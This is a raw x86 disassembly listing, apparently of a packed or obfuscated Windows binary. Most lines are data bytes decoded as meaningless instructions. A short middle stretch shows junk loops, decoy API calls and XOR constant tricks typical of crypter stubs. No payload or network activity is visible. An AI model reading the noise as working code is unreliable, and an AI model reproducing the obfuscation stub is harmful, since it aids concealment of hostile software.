  4059a1:	repz and BYTE PTR [eax-0x7193399b],al
  4059a8:	icebp  
  4059a9:	xchg   ebp,eax
  4059aa:	add    al,0x2
  4059ac:	(bad)  
  4059ad:	out    dx,al
  4059ae:	dec    edx
  4059af:	fs mov ebx,0x1cc47c8f
  4059b5:	xchg   edx,eax
  4059b6:	ja     0x405944
  4059b8:	cmp    BYTE PTR [esi+0x51c87ab1],0x0
  4059bf:	retf   
  4059c0:	mov    fs,WORD PTR [esi+0x1d]
  4059c3:	cwde   
  4059c4:	test   al,0x5a
  4059c6:	push   es
  4059c7:	data16 clc 
  4059c9:	jmp    0x5c68cf53
  4059ce:	mov    ebp,0xeb046888
  4059d3:	jp     0x405a35
  4059d5:	dec    edi
  4059d6:	into   
  4059d7:	jecxz  0x4059cf
  4059d9:	cmp    dl,bh
  4059db:	xor    al,0x7
  4059dd:	inc    ebp
  4059de:	pop    ds
  4059df:	nop
  4059e0:	rcr    dh,0x8f
  4059e3:	push   0xa718f61e
  4059e8:	dec    esp
  4059e9:	or     ecx,DWORD PTR [edi]
  4059eb:	jp     0x405a58
  4059ed:	jae    0x4059d4
  4059ef:	mov    bh,0xf0
  4059f1:	cmp    al,0x61
  4059f3:	test   eax,0x4e7e9b3
  4059f8:	pop    ebp
  4059f9:	push   ebx
  4059fa:	(bad)  
  4059fb:	push   edi
  4059fc:	mov    BYTE PTR [eax],ch
  4059fe:	pop    edx
  4059ff:	push   ebp
  405a00:	in     eax,0x41
  405a02:	mov    eax,0xe6a6cab7
  405a07:	push   edx
  405a08:	adc    DWORD PTR [ebx-0x34],eax
  405a0b:	clc    
  405a0c:	add    eax,0x2438758d
  405a11:	adc    DWORD PTR [esi],ebx
  405a13:	outs   dx,BYTE PTR ds:[esi]
  405a14:	dec    ebp
  405a15:	inc    eax
  405a16:	pop    edx
  405a17:	inc    ebp
  405a18:	test   DWORD PTR [edx+0x70],esp
  405a1b:	cmp    al,0xdc
  405a1d:	ins    BYTE PTR es:[edi],dx
  405a1e:	xchg   edx,eax
  405a1f:	mov    ebp,0x84a0805
  405a24:	lock adc ecx,DWORD PTR gs:[ebx+0x42]
  405a29:	jne    0x4059e7
  405a2b:	jl     0x405a17
  405a2d:	repz pop esp
  405a2f:	lods   al,BYTE PTR ds:[esi]
  405a30:	and    BYTE PTR [esi-0x661df118],bl
  405a36:	dec    esp
  405a37:	test   ch,bh
  405a39:	test   ebx,esi
  405a3b:	or     al,0x0
  405a3d:	sar    ebp,cl
  405a3f:	push   esi
  405a40:	xchg   esp,eax
  405a41:	ret    0xbd15
  405a44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a45:	adc    DWORD PTR fs:[ebx-0x37c80f48],0xfffffff9
  405a4d:	shl    BYTE PTR [esi+0x4a],1
  405a50:	cdq    
  405a51:	jecxz  0x405ace
  405a53:	gs bswap edx
  405a56:	adc    esi,DWORD PTR cs:[ebx]
  405a59:	in     eax,0x40
  405a5b:	in     al,0xa0
  405a5d:	mov    edx,0x19e01211
  405a62:	data16 je 0x4059ec
  405a65:	push   cs
  405a66:	jb     0x405ac8
  405a68:	test   eax,0xfeeb7ec
  405a6d:	in     al,dx
  405a6e:	pop    esi
  405a6f:	xchg   edi,eax
  405a70:	mov    eax,0xc86a957b
  405a75:	or     al,BYTE PTR [ecx]
  405a77:	push   ebx
  405a78:	push   ecx
  405a79:	xchg   DWORD PTR [edx],ebp
  405a7b:	jns    0x405ae0
  405a7d:	retf   0xb30d
  405a80:	lea    ecx,[eax]
  405a82:	or     DWORD PTR [ecx],0xffffffb6
  405a85:	mov    al,ds:0x4515366b
  405a8a:	adc    edx,DWORD PTR [ebp+0x5358ec52]
  405a90:	inc    esp
  405a91:	dec    esi
  405a92:	or     BYTE PTR [esi-0x646e555d],ch
  405a98:	sub    eax,0xcf1215df
  405a9d:	cmp    edi,0xffffffb6
  405aa0:	push   edi
  405aa1:	push   ds
  405aa2:	mov    ecx,DWORD PTR [edi+eax*8-0x73]
  405aa6:	pop    edi
  405aa7:	aam    0x11
  405aa9:	fidivr DWORD PTR [ecx-0x65]
  405aac:	jle    0x405b0a
  405aae:	adc    al,0x86
  405ab1:	out    dx,al
  405ab2:	out    dx,eax
  405ab3:	mov    eax,ds:0xa111f0ab
  405ab9:	pop    ebp
  405aba:	mov    esi,0x74016f20
  405abf:	loopne 0x405ae2
  405ac1:	push   ss
  405ac2:	test   DWORD PTR [ecx],ebp
  405ac4:	adc    esp,DWORD PTR [ebx+0x11]
  405ac7:	adc    cl,BYTE PTR [edi-0x75]
  405aca:	mov    WORD PTR [esi-0x4de8739],cs
  405ad0:	inc    ebx
  405ad1:	dec    cl
  405ad3:	mov    ecx,0x7264fca9
  405ad8:	div    ecx
  405ada:	mov    ecx,DWORD PTR [ebp+0x10]
  405add:	and    ecx,eax
  405adf:	or     ecx,0x81161d8f
  405ae5:	mov    eax,ecx
  405ae7:	pop    ebp
  405ae8:	ret    0x18
  405aeb:	push   ebp
  405aec:	mov    ebp,esp
  405aee:	push   ecx
  405aef:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405af6:	add    DWORD PTR ds:0x43441d,ecx
  405afc:	mov    eax,DWORD PTR [ebp-0x4]
  405aff:	mov    edx,DWORD PTR [ebp+0x10]
  405b02:	mov    ecx,DWORD PTR ds:0x4343a6
  405b08:	mov    ecx,DWORD PTR [ecx]
  405b0a:	add    DWORD PTR ds:0x434429,ecx
  405b10:	mov    ecx,0x7510855
  405b15:	xor    eax,ecx
  405b17:	sub    DWORD PTR ds:0x432dce,0x487f
  405b21:	add    eax,0x32729c
  405b26:	xor    DWORD PTR ds:0x434396,0x6d44
  405b30:	mov    DWORD PTR [edx],eax
  405b32:	inc    DWORD PTR ds:0x43436e
  405b38:	mov    eax,DWORD PTR [ebp+0x14]
  405b3b:	sub    DWORD PTR ds:0x432dc2,0x7e8e
  405b45:	mov    edx,DWORD PTR [ebp+0x10]
  405b48:	mov    DWORD PTR [edx+0x4],eax
  405b4b:	mov    eax,DWORD PTR [ebp+0x18]
  405b4e:	mov    edx,DWORD PTR [ebp+0x10]
  405b51:	adc    DWORD PTR ds:0x43436e,0x4326fc
  405b5b:	mov    DWORD PTR [edx+0x8],eax
  405b5e:	mov    eax,DWORD PTR [ebp+0x1c]
  405b61:	mov    edx,DWORD PTR [ebp+0x10]
  405b64:	sub    DWORD PTR ds:0x432dc6,0x432dda
  405b6e:	mov    DWORD PTR [edx+0xc],eax
  405b71:	and    DWORD PTR ds:0x434376,0x0
  405b7b:	jmp    0x405b8b
  405b80:	mov    eax,ds:0x434376
  405b85:	inc    eax
  405b86:	mov    ds:0x434376,eax
  405b8b:	cmp    DWORD PTR ds:0x434376,0x14
  405b92:	jae    0x405bcd
  405b98:	cmp    DWORD PTR ds:0x434376,0x7
  405b9f:	jne    0x405bb0
  405ba5:	push   0x400000
  405baa:	call   DWORD PTR ds:0x432cee
  405bb0:	cmp    DWORD PTR ds:0x434376,0x6
  405bb7:	jne    0x405bc8
  405bbd:	mov    eax,ds:0x434376
  405bc2:	inc    eax
  405bc3:	mov    ds:0x434376,eax
  405bc8:	jmp    0x405b80
  405bcd:	mov    eax,DWORD PTR [ebp+0x20]
  405bd0:	mov    edx,DWORD PTR [ebp+0x10]
  405bd3:	mov    DWORD PTR [edx+0x10],eax
  405bd6:	mov    eax,eax
  405bd8:	mov    eax,DWORD PTR [ebp+0x14]
  405bdb:	test   eax,eax
  405bdd:	mov    eax,DWORD PTR [ebp+0x8]
  405be0:	jne    0x405be9
  405be6:	mov    eax,DWORD PTR [ebp+0xc]
  405be9:	xor    eax,ecx
  405beb:	add    eax,0x32729c
  405bf0:	leave  
  405bf1:	ret    0x1c
  405bf4:	push   ebp
  405bf5:	mov    ebp,esp
  405bf7:	sub    esp,0x78
  405bfa:	add    DWORD PTR ds:0x434382,edi
  405c00:	mov    eax,ds:0x4161a0
  405c05:	sbb    DWORD PTR ds:0x432dd2,0x30a0
  405c0f:	mov    DWORD PTR [ebp-0x10],eax
  405c12:	and    DWORD PTR ds:0x434372,0x0
  405c1c:	jmp    0x405c2c
  405c21:	mov    eax,ds:0x434372
  405c26:	inc    eax
  405c27:	mov    ds:0x434372,eax
  405c2c:	cmp    DWORD PTR ds:0x434372,0x12
  405c33:	jae    0x405cc7
  405c39:	cmp    DWORD PTR ds:0x434372,0x8
  405c40:	jne    0x405c56
  405c46:	push   0x59ce
  405c4b:	push   0x3d0e
  405c50:	call   DWORD PTR ds:0x4329c6
  405c56:	cmp    DWORD PTR ds:0x434372,0x7
  405c5d:	jne    0x405c71
  405c63:	xor    eax,eax
  405c65:	or     eax,DWORD PTR ds:0x434372
  405c6b:	inc    eax
  405c6c:	mov    ds:0x434372,eax
  405c71:	jmp    0x405c21
  405c76:	and    DWORD PTR ds:0x4326ec,0x0
  405c80:	jmp    0x405c93
  405c85:	xor    eax,eax
  405c87:	add    eax,DWORD PTR ds:0x4326ec
  405c8d:	inc    eax
  405c8e:	mov    ds:0x4326ec,eax
  405c93:	cmp    DWORD PTR ds:0x4326ec,0x19
  405c9a:	jae    0x405cc7
  405ca0:	cmp    DWORD PTR ds:0x4326ec,0x24
  405ca7:	jne    0x405cb8
  405cad:	push   0x2979
  405cb2:	call   DWORD PTR ds:0x432cf2
  405cb8:	jmp    0x405c85
  405cbd:	adc    DWORD PTR ds:0x432700,0x4b3c
  405cc7:	mov    eax,ds:0x4162ac
  405ccc:	mov    DWORD PTR [ebp-0x30],eax
  405ccf:	mov    eax,ds:0x43439a
  405cd4:	adc    DWORD PTR ds:0x434372,eax
  405cda:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  405ce1:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  405ce8:	and    DWORD PTR ds:0x432dce,0x0
  405cf2:	jmp    0x405d05
  405cf7:	xor    eax,eax
  405cf9:	xor    eax,DWORD PTR ds:0x432dce
  405cff:	inc    eax
  405d00:	mov    ds:0x432dce,eax
  405d05:	cmp    DWORD PTR ds:0x432dce,0x17
  405d0c:	jae    0x405d74
  405d12:	cmp    DWORD PTR ds:0x432dce,0x24
  405d19:	jne    0x405d65
  405d1f:	push   0x4328ab
  405d24:	push   DWORD PTR [ebp-0x24]
  405d27:	push   DWORD PTR [ebp-0x1c]
  405d2a:	push   0x2bca
  405d2f:	push   0x26af
  405d34:	push   0x4217
  405d39:	push   0x24e1
  405d3e:	push   0x5f7a
  405d43:	push   DWORD PTR [ebp-0x28]
  405d46:	push   0x4151
  405d4b:	push   0x4efd
  405d50:	push   0x2a4d
  405d55:	push   0x1961
  405d5a:	push   0x8799
  405d5f:	call   DWORD PTR ds:0x432c36
  405d65:	jmp    0x405cf7
  405d6a:	sbb    DWORD PTR ds:0x432dca,0x4665
  405d74:	mov    eax,DWORD PTR [ebp-0xc]
  405d77:	push   ebx
  405d78:	sbb    DWORD PTR ds:0x43442d,0x432dd2
  405d82:	push   esi
  405d83:	push   edi
  405d84:	mov    esi,0x7510855
  405d89:	and    DWORD PTR ds:0x4326fc,0xdb
  405d93:	jmp    0x4060e0
  405d98:	mov    ecx,0x75ce7592
  405d9d:	jmp    0x6331ef03
  405da2:	sub    BYTE PTR [ebx],bl
  405da4:	mov    al,ds:0x8be9e117
  405da9:	xor    al,0x70
  405dab:	jo     0x405dcd
  405dad:	jge    0x405e1f
  405daf:	jo     0x405dd3
  405db1:	inc    eax
  405db2:	xor    dl,BYTE PTR [eax]
  405db4:	cmp    al,BYTE PTR [ecx-0x66c91683]
  405dba:	test   BYTE PTR [ecx-0x2052bff3],bh
  405dc0:	pop    esp
  405dc1:	clc    
  405dc2:	sub    al,0xd2
  405dc4:	and    BYTE PTR [eax+0x3f622056],dh
  405dca:	push   ecx
  405dcb:	sar    esi,1
  405dcd:	out    0x3f,al
  405dcf:	imul   esp,ecx,0xd8506250
  405dd5:	jae    0x405d9f
  405dd7:	mov    dl,ch
  405dd9:	push   0x5403790d
  405dde:	out    0xaa,eax
  405de0:	std    
  405de1:	cld    
  405de2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405de3:	mov    bl,0x36
  405de5:	push   es
  405de6:	mov    al,0x10
  405de8:	mov    eax,ds:0x9a61862b
  405ded:	cdq    
  405dee:	mov    edi,0x24a807aa
  405df3:	mov    edx,0xb9532cab
  405df8:	sub    BYTE PTR [esp+ecx*2-0x2f],0xb7
  405dfd:	mov    esi,0xd47d7554
  405e02:	mov    ebp,0x8d3c2d25
  405e07:	or     bl,dl
  405e09:	mov    bh,0x8a
  405e0b:	aas    
  405e0c:	push   edi
  405e0d:	jb     0x405e76
  405e0f:	mov    BYTE PTR ds:0x2ba6934a,bh
  405e15:	or     eax,0x335cf108
  405e1a:	aam    0x6d
  405e1c:	or     BYTE PTR [esi-0x34cc7562],cl
  405e22:	hlt    
  405e23:	jb     0x405e01
  405e25:	lods   eax,DWORD PTR ds:[esi]
  405e26:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  405e28:	dec    esi
  405e29:	mov    esp,0x814171b
  405e2e:	fidivr WORD PTR [edx-0x30003a81]
  405e34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e35:	and    BYTE PTR [edi+0x8ad0683],al
  405e3b:	mov    bl,0x3c
  405e3d:	or     esp,DWORD PTR [ebx]
  405e3f:	in     al,dx
  405e40:	gs int3 
  405e42:	jmp    0x67bbdcc6
  405e47:	(bad)  
  405e48:	repz enter 0x1b54,0xc
  405e4d:	jl     0x405dee
  405e4f:	mov    edi,0x492fffcc
  405e54:	mov    ebp,ebx
  405e56:	aam    0xf6
  405e58:	inc    edx
  405e59:	mov    DWORD PTR [ebp-0x46586182],ebp
  405e5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e60:	ror    BYTE PTR [ebx-0x26d1f72],0xd0
  405e67:	dec    edx
  405e68:	mov    ecx,0x5bdc417d
  405e6d:	sbb    dl,BYTE PTR [eax-0x6a]
  405e70:	leave  
  405e71:	(bad)  
  405e72:	inc    ebp
  405e73:	loopne 0x405e6b
  405e75:	dec    ebx
  405e76:	xor    ecx,esp
  405e78:	mov    edx,0x1a0a7fd6
  405e7d:	pushf  
  405e7e:	sub    edi,DWORD PTR [edi-0x72576bde]
  405e84:	sub    dh,bh
  405e86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e87:	xchg   ebp,eax
  405e88:	dec    eax
  405e89:	and    bh,dh
  405e8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e8c:	fcomp  DWORD PTR [esi]
  405e8e:	dec    ecx
  405e8f:	ins    BYTE PTR es:[edi],dx
  405e90:	xor    DWORD PTR [edi-0x33],0xe838436c
  405e97:	push   cs
  405e98:	stc    
  405e99:	into   
  405e9a:	sbb    al,0xb8
  405e9c:	sub    eax,0x690bd89e
  405ea1:	stos   DWORD PTR es:[edi],eax
  405ea2:	cmp    cl,0xb3
  405ea5:	push   edi
  405ea6:	hlt    
  405ea7:	pop    eax
  405ea8:	mov    cl,0x8
  405eaa:	inc    esp
  405eab:	clc    
  405eac:	pop    es
  405ead:	cdq    
  405eae:	and    BYTE PTR [ebx-0x7b],cl
  405eb1:	mov    esi,0xc2a02ef8
  405eb6:	jns    0x405ef5
  405eb8:	retf   
  405eb9:	add    eax,0xa7f816de
  405ebe:	mov    ebx,0x4def2e66
  405ec3:	es sub eax,0xeac54b1d
  405ec9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405eca:	mov    edx,0x36695e78
  405ecf:	das    
  405ed0:	gs push es
  405ed2:	mov    ecx,0x758b90d2
  405ed7:	mov    ds:0xc4a14dad,eax
  405edc:	jmp    0x405ef5
  405ede:	mov    DWORD PTR [esi-0x31b19d55],eax
  405ee4:	daa    
  405ee5:	inc    edx
  405ee6:	in     al,dx
  405ee7:	in     al,0x4e
  405ee9:	(bad)  
  405eea:	in     al,dx
  405eeb:	stos   BYTE PTR es:[edi],al
  405eec:	cmp    DWORD PTR [edi+0x574afa2f],ecx
  405ef2:	and    ch,dh
  405ef4:	loop   0x405ed3
  405ef6:	fnstsw WORD PTR [esi-0xb]
  405ef9:	pop    ecx
  405efa:	pop    ecx
  405efb:	push   ecx
  405efc:	pop    edi
  405efd:	or     DWORD PTR [esi-0x1b],edx
  405f00:	sbb    bh,BYTE PTR [esi+0x4d]
  405f03:	loopne 0x405f56
  405f05:	ja     0x405f53
  405f07:	jecxz  0x405e94
  405f09:	(bad)  
  405f0a:	out    dx,al
  405f0b:	jp     0x405f60
  405f0d:	scas   eax,DWORD PTR es:[edi]
  405f0e:	jp     0x405f7a
  405f10:	aas    
  405f11:	fs dec ebp
  405f13:	call   0x7a4dd05b
  405f18:	jg     0x405f66
  405f1a:	mov    ds:0xbf2879f1,al
  405f1f:	fcomi  st,st(6)
  405f21:	jge    0x405eb8
  405f23:	sub    bl,BYTE PTR [esi-0x6b]
  405f26:	mov    esi,0xc5711136
  405f2b:	es inc edi
  405f2d:	adc    DWORD PTR [edi],0xad9eeea9
  405f33:	xor    eax,0xf10e2f46
  405f38:	out    0x46,al
  405f3a:	add    eax,0xd25653f9
  405f3f:	mov    bh,0x5b
  405f41:	in     eax,0x16
  405f43:	pop    ss
  405f44:	cmp    ah,dh
  405f46:	xchg   bl,bh
  405f48:	mov    ds:0xbbc60f48,al
  405f4d:	(bad)  
  405f4e:	jno    0x405f93
  405f50:	adc    esp,edi
  405f52:	mov    al,0x3e
  405f54:	pusha  
  405f55:	cli    
  405f56:	cmp    BYTE PTR [ecx+eax*4-0x6b],cl
  405f5a:	cmp    al,0xa4
  405f5c:	nop
  405f5d:	xor    edx,DWORD PTR [eax+0x6e]
  405f60:	in     eax,dx
  405f61:	leave  
  405f62:	hlt    
  405f63:	xchg   esp,eax
  405f64:	cmc    
  405f65:	retf   0xbe8d
  405f68:	test   al,0x9b
  405f6a:	fdivr  st,st(4)
  405f6c:	cmp    eax,0x59a21d11
  405f71:	sub    DWORD PTR [edx+0x7e],ebx
  405f74:	aas    
  405f75:	xlat   BYTE PTR ds:[ebx]
  405f76:	pop    eax
  405f77:	dec    edx
  405f78:	in     eax,dx
  405f79:	test   DWORD PTR [esi-0x3d2fabff],ecx
  405f7f:	sbb    bh,BYTE PTR [ebx]
  405f81:	imul   ecx,DWORD PTR [edx+0x63],0xffffffb0
  405f85:	sbb    DWORD PTR [edi-0x52],0xffffffb4
  405f89:	int    0x2f
  405f8b:	(bad)  
  405f8c:	cld    
  405f8d:	and    cl,BYTE PTR [edi+0x27]
  405f90:	pop    edx
  405f91:	xchg   edx,eax
  405f92:	sbb    ah,BYTE PTR [ebp+ebp*4-0x22f9915c]
  405f99:	loope  0x405f7b
  405f9b:	inc    al
  405f9d:	add    DWORD PTR [ebp+0x32a78075],0x2fabc7a7
  405fa7:	out    dx,eax
  405fa8:	in     al,dx
  405fa9:	xor    edi,DWORD PTR [ecx]
  405fab:	icebp  
  405fac:	push   es
  405fad:	dec    edx
  405fae:	out    0x66,eax
  405fb0:	pop    esp
  405fb1:	mov    ds:0x332e9e3a,eax
  405fb6:	dec    ebx
  405fb7:	or     BYTE PTR [eax-0xf],ah
  405fba:	sub    eax,0x7d66272e
  405fbf:	sbb    eax,0xd13a62e8
  405fc4:	cmp    DWORD PTR [edx],0x53286073
  405fca:	mov    eax,ds:0x1c88c624
  405fcf:	adc    DWORD PTR [edx+0x47],esi
  405fd2:	pushf  
  405fd3:	mov    ebx,0xa091b3ea
  405fd8:	(bad)  
  405fd9:	loopne 0x406049
  405fdb:	popa   
  405fdc:	xchg   ah,bh
  405fde:	sbb    BYTE PTR [ebx+0x2f],0x2d
  405fe2:	sub    al,0x2c
  405fe4:	lea    ecx,[edx]
  405fe6:	or     esp,esi
  405fe8:	les    eax,FWORD PTR [edi+esi*2]
  405feb:	xchg   ecx,eax
  405fec:	sub    ah,BYTE PTR [esp+esi*1]
  405fef:	mov    ah,0x12
  405ff1:	xor    BYTE PTR [esi],dl
  405ff3:	popa   
  405ff4:	push   ebx
  405ff5:	adc    ah,bl
  405ff7:	xor    DWORD PTR [ecx-0xe66a800],esi
  405ffd:	into   
  405ffe:	outs   dx,DWORD PTR ds:[esi]
  405fff:	mov    eax,0x80c32f8d
  406004:	shl    eax,cl
  406006:	mov    eax,0x3fd11a00
  40600b:	inc    ebp
  40600c:	or     ebp,esp
  40600e:	add    eax,0xd94e1b2
  406013:	das    
  406014:	int3   
  406015:	add    BYTE PTR [edx-0x7b],dl
  406018:	ja     0x40603f
  40601a:	xchg   ebx,eax
  40601b:	sub    dh,bl
  40601d:	xor    esi,DWORD PTR [edi]
  40601f:	add    al,bl
  406021:	push   ds
  406022:	js     0x406024
  406024:	in     al,dx
  406025:	mov    eax,ds:0x84c9ee21
  40602a:	adc    ebp,eax
  40602c:	cmp    BYTE PTR [edx+eax*4-0x36],dl
  406030:	sub    al,0x2d
  406032:	dec    edx
  406033:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406034:	ret    0xc883
  406037:	sbb    DWORD PTR [edx-0x52676647],esi
  40603d:	cdq    
  40603e:	xchg   esi,eax
  40603f:	mov    WORD PTR [edi+0x41],cs
  406042:	mov    ebp,DWORD PTR [esi]
  406044:	(bad)  
  406045:	shr    DWORD PTR [edx+0x47574006],cl
  40604b:	pop    edi
  40604c:	dec    esp
  40604d:	ins    DWORD PTR es:[edi],dx
  40604e:	loopne 0x40600a
  406050:	stos   DWORD PTR es:[edi],eax
  406051:	add    ebp,DWORD PTR [esi-0x1a]
  406054:	jnp    0x406071
  406056:	outs   dx,DWORD PTR ds:[esi]
  406057:	aad    0xbe
  406059:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40605a:	cmp    eax,0x4ce0e918
  40605f:	pop    ss
  406060:	inc    ebx
  406061:	jg     0x4060c4
  406063:	iret   
  406064:	out    dx,eax
  406065:	addr16 cwde 
  406067:	add    eax,0x4de6ff4b
  40606c:	pop    ecx
  40606d:	xchg   edx,eax
  40606e:	arpl   WORD PTR [esi],sp
  406070:	dec    edx
  406071:	xchg   esi,eax
  406072:	xor    BYTE PTR [ecx+0x69e8d0d0],0x3d
  406079:	test   al,0x7a
  40607b:	xchg   BYTE PTR [ecx],dh
  40607d:	out    dx,eax
  40607e:	fsubr  QWORD PTR [eax+edx*4]
  406081:	jno    0x40600b
  406083:	inc    esi
  406084:	sbb    DWORD PTR [ebp+eiz*4-0x158f555e],0xc0ed4e6e
  40608f:	mov    ds:0xf1bce224,al
  406094:	add    al,0x90
  406096:	inc    esp
  406097:	xchg   edx,eax
  406098:	in     al,0x2b
  40609a:	xchg   edx,eax
  40609b:	mov    bh,0x4d
  40609d:	and    dh,BYTE PTR es:[ecx+ebx*1]
  4060a1:	push   ebx
  4060a2:	test   edi,eax
  4060a4:	sub    eax,0x452bc22c
  4060a9:	out    dx,eax
  4060aa:	mov    dh,0x85
  4060ac:	(bad)  
  4060ad:	(bad)  
  4060ae:	aad    0x59
  4060b0:	jp     0x4060be
  4060b2:	push   esi
  4060b3:	jl     0x4060a8
  4060b5:	stos   DWORD PTR es:[edi],eax
  4060b6:	xor    esi,DWORD PTR [ebp-0x4]
  4060b9:	mov    esp,0x9482ade6
  4060be:	out    0xd4,al
  4060c0:	sar    DWORD PTR [ebx-0x10],0xea
  4060c4:	aad    0x4e
  4060c6:	jecxz  0x406068
  4060c8:	jecxz  0x4060dd
  4060ca:	cmp    ebx,DWORD PTR [esi+0x3d]
  4060cd:	fiadd  DWORD PTR [esi+0x5faf1bcc]
  4060d3:	lods   eax,DWORD PTR ds:[esi]
  4060d4:	jmp    0xe191:0xbd1aede
  4060db:	pop    eax
  4060dc:	repz push 0xffffffe4
  4060df:	add    eax,0x3d01c633
  4060e4:	mov    esi,0xbf00432d
  4060e9:	pushf  
  4060ea:	jb     0x40611e
  4060ec:	add    BYTE PTR [ecx+0x43441d25],al
  4060f2:	add    BYTE PTR [ebp+0x3e],bh
  4060f5:	add    BYTE PTR [eax],al
  4060f7:	add    eax,edi
  4060f9:	jmp    0x406446
  4060fe:	xchg   esp,eax
  4060ff:	test   eax,0x69f5e9e0
  406104:	xchg   ecx,eax
  406105:	jno    0x406179
  406107:	xchg   edx,eax
  406108:	js     0x406147
  40610a:	adc    al,0x72
  40610c:	jle    0x406114
  40610e:	mov    ebx,0x20707031
  406113:	jge    0x406185
  406115:	jo     0x4060de
  406117:	(bad)  
  406118:	or     ecx,ecx
  40611a:	std    
  40611b:	rol    DWORD PTR [edx+0x0],0x79
  40611f:	std    
  406120:	jmp    0x406115
  406122:	into   
  406123:	(bad)  
  406125:	lahf   
  406126:	sbb    al,0x75
  406128:	push   es
  406129:	fs or  al,ch
  40612c:	ja     0x4061ab
  40612e:	mov    ch,ch
  406130:	jnp    0x4060e7
  406132:	(bad)  
  406133:	mov    esp,0x483584a8
  406138:	addr16 retf 0xf68
  40613c:	lock mov dh,0x72
  40613f:	sub    eax,0x3a0e5918
  406144:	jg     0x40611b
  406146:	dec    ebx
  406147:	xchg   esi,eax
  406148:	in     al,dx
  406149:	inc    ebp
  40614a:	das    
  40614b:	daa    
  40614c:	(bad)  
  40614d:	fimul  WORD PTR [ebx+0x17f5907f]
  406153:	enter  0xb660,0x3c
  406157:	pop    ecx
  406158:	ins    BYTE PTR es:[edi],dx
  406159:	ins    DWORD PTR es:[edi],dx
  40615a:	jmp    0x482:0xba807137
  406161:	bound  esp,QWORD PTR [ebx-0x2cb58c64]
  406167:	push   es
  406168:	stos   BYTE PTR es:[edi],al
  406169:	hlt    
  40616a:	inc    ebx
  40616b:	lahf   
  40616c:	mov    al,0xf8
  40616e:	sub    ebp,ebp
  406170:	mov    al,0xc8
  406172:	sbb    eax,ebp
  406174:	popa   
  406175:	out    dx,eax
  406176:	lock lods eax,DWORD PTR ds:[esi]
  406178:	je     0x406124
  40617a:	arpl   WORD PTR [ebp+0x18f484fa],sp
  406180:	enter  0x48b4,0x2d
  406184:	fs cmp edi,esi
  406187:	push   esi
  406188:	(bad)  
  406189:	fsubr  QWORD PTR [ebx-0x4c]
  40618c:	call   FWORD PTR [ebp-0x1b752d5b]
  406192:	mov    ah,0x2a
  406194:	lds    edx,FWORD PTR [ecx+0x1bb1f4e8]
  40619a:	pop    ss
  40619b:	enter  0xff8a,0xc5
  40619f:	and    al,0x75
  4061a1:	mov    edx,0xcbd810da
  4061a6:	fist   DWORD PTR ds:0x3f9cf6d6
  4061ac:	push   esi
  4061ad:	dec    eax
  4061ae:	repnz xor dl,BYTE PTR [ecx-0x3fed64c8]
  4061b5:	or     BYTE PTR [edi],bh
  4061b7:	std    
  4061b8:	sbb    eax,0xe39f4263
  4061bd:	stos   DWORD PTR es:[edi],eax
  4061be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061bf:	pop    eax
  4061c0:	adc    al,0x64
  4061c2:	sub    bl,al
  4061c4:	bound  edx,QWORD PTR [esi*8+0x42779d5a]
  4061cb:	xchg   edi,ecx
  4061cd:	cmp    al,BYTE PTR [ecx+edx*4-0x41deae48]
  4061d4:	rcr    DWORD PTR [edi+0x9f5095f],0x92
  4061db:	fistp  WORD PTR [esi+esi*2]
  4061de:	xor    al,0xbf
  4061e0:	xor    DWORD PTR [ecx],eax
  4061e2:	and    edi,DWORD PTR [esi-0x21531f45]
  4061e8:	pop    esp
  4061e9:	mov    ebx,0x8b25aedb
  4061ee:	stos   BYTE PTR es:[edi],al
  4061ef:	hlt    
  4061f0:	out    0x44,al
  4061f2:	xor    eax,0xe24fa08c
  4061f7:	sbb    al,0x73
  4061f9:	adc    eax,0xcfa0acbb
  4061fe:	inc    ecx
  4061ff:	or     esi,ebx
  406201:	in     eax,dx
  406202:	fwait
  406203:	pop    esi
  406204:	shl    BYTE PTR [ebx+0x636fc3b7],0x48
  40620b:	or     BYTE PTR [ebp+0x1f],dh
  40620e:	push   0xd64f696d
  406213:	sbb    edx,edx
  406215:	aad    0x22
  406217:	scas   al,BYTE PTR es:[edi]
  406218:	jne    0x4061cf
  40621a:	lods   eax,DWORD PTR ds:[esi]
  40621b:	vpsubw xmm0,xmm4,xmm6
  40621f:	fstp   DWORD PTR [edi+0x13686962]
  406225:	sbb    DWORD PTR [eax+0x32],esi
  406228:	sbb    ch,bh
  40622a:	popa   
  40622b:	push   0x55
  40622d:	pop    ds
  40622e:	das    
  40622f:	les    ebp,FWORD PTR [edx+0x65]
  406232:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406234:	sbb    DWORD PTR [ebx],0x47
  406237:	xor    al,0x8b
  406239:	inc    ebx
  40623a:	std    
  40623b:	xor    al,0xf4
  40623d:	dec    eax
  40623e:	jnp    0x4061ca
  406240:	stos   DWORD PTR es:[edi],eax
  406241:	cmp    edi,DWORD PTR [eax+0x4]
  406244:	into   
  406245:	lods   eax,DWORD PTR ds:[esi]
  406246:	(bad)
  40624a:	clc    
  40624b:	xlat   BYTE PTR ds:[ebx]
  40624c:	push   esi
  40624d:	mov    ecx,0x7d672cb8
  406252:	lods   eax,DWORD PTR ds:[esi]
  406253:	cmp    bl,BYTE PTR [ebx+ebp*4-0x419e4115]
  40625a:	mov    esp,0x175d3f1e
  40625f:	nop
  406260:	xchg   ecx,eax
  406261:	outs   dx,BYTE PTR ds:[esi]
  406262:	xlat   BYTE PTR gs:[ebx]
  406264:	cld    
  406265:	shl    BYTE PTR cs:[ebx+0x77fe4c18],1
  40626c:	scas   eax,DWORD PTR es:[edi]
  40626d:	int    0x7d
  40626f:	ficom  DWORD PTR [ebp-0x6e14890b]
  406275:	xchg   ebx,eax
  406276:	jo     0x406274
  406278:	loop   0x40625d
  40627a:	adc    BYTE PTR [ecx+edi*8],bh
